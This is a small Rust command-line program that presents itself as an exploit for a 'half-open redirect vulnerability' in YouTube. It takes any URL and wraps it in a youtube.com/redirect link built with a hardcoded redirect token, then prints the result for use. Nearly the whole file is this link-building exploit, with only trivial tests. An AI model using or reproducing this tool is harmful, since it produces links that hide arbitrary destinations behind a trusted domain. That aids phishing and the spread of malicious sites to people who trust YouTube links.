use std::env;
use std::process;

fn main() {
	print_header();

	let args: Vec<String> = env::args().collect();
	let q;

	match args.len() {
        2 => {
            q = strip_trailing_newline(&args[1]);
        },
        _ => {
            print_help();
            process::exit(1);
        }
    }

    let token = String::from("QUFFLUhqbjk1bkxnamRJSXA1ZHFSZlIzdkQ4RWZWekIzUXxBQ3Jtc0tudHloUlNaM3FxS1hTbGl5M1Q5SGpiNmI3MkNSbU5fSnVNNTBHOTh6b05meVNEeFcwMENpNnEtd3ZKYmZxTGYzR2tnd04tRWpRZnhMQ1I4eHJWNG1YT1BrUlFLbE96Nmg5bHdzcy1OOGVBQ2ROM05KTQ");
    let opt_event = String::from("video_description");
    let opt_video_id = String::new();

    // let q = strip_trailing_newline(&q);

    println!("");
    println!("");

    let url = format!("https://www.youtube.com/redirect?q={}&redir_token={}&event={}&v={}",
		q, token, opt_event, opt_video_id);

    println!("use this link: {}", url);
}

fn strip_trailing_newline(input: &str) -> &str {
    return input.strip_suffix("\r\n")
           .or(input.strip_suffix("\n"))
           .unwrap_or(&input);
}

fn print_header() {
    println!("");
    println!("");
	println!("\t############################################");
    println!("\tHalf-open redirect vulnerability in Youtube!");
    println!("\t############################################");
    // TODO add the article as reference

    println!("");
    println!("");
}

fn print_help() {
    println!("usage:");
	println!("youtube-half-open-redirect-vuln <url> \t Exploit the half-open-redirect vulnerability.");
}


#[test] //#[ignore] // only in need
fn strip_newline_works(){
    assert_eq!(strip_trailing_newline("test0\r\n\r\n"), "test0\r\n");
    assert_eq!(strip_trailing_newline("test1\r\n"), "test1");
    assert_eq!(strip_trailing_newline("test2\n"), "test2");
    assert_eq!(strip_trailing_newline("test3"), "test3");
}

#[test]
fn it_works(){
	// todo!();
	assert_eq!(true, true);
}